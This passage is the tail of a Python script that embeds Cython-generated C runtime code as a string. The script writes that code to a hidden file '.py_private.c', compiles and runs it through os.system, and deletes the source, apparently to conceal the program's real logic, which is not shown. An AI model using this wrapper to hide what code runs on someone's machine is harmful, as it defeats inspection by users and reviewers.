                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
